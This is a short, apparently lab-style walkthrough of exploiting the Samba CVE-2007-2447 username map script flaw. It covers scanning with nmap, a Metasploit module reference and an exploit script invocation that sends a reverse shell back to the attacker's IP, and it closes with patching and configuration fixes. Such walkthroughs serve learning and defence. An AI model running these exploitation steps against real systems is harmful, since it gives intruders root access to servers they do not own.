Full Walkthrough: Samba username map script RCE (CVE-2007-2447)
Theory & Background
Samba versions 3.0.20 through 3.0.25rc3 contained a critical vulnerability in the username map script configuration option. If this option was enabled in smb.conf, an attacker could inject shell metacharacters (/&;%|) into a username during authentication. This would cause the specified script to execute the attacker's commands with the privileges of the Samba server (often root).

Step-by-Step Walkthrough
1. Identification
bash
nmap -p139,445 -sV --script smb-os-discovery,smb-vuln-ms07-029 <target_ip>
# Also check for the specific script
nmap -p445 --script smb-vuln-cve-2007-2447 <target_ip>
Expected Result: Nmap will identify the Samba version and the specific script may confirm the vulnerability.

2. Exploitation
bash
# 1. Use a dedicated exploit (e.g., from Metasploit)
# searchsploit samba 3.0.20
# use exploit/multi/samba/usermap_script

# 2. Manual exploitation with a payload
# The vulnerability is in the Samba login process.
telnet <target_ip> 445
# Trying <target_ip>...
# ... (complex binary protocol)

# It's far easier to use an existing Python exploit script.
# Example command from an exploit script:
python /usr/share/exploitdb/exploits/unix/remote/16320.py <target_ip> <your_ip> 4444
What to do: The exploit script will send a malicious login request. If successful, you will receive a reverse shell connection on your listener with root privileges.

3. Mitigation
Patching: Immediately upgrade Samba to a version newer than 3.0.25.

Configuration: If upgrading is not possible, remove the username map script = /etc/samba/usermap.sh (or similar) line from the [global] section of smb.conf and restart the smbd service.

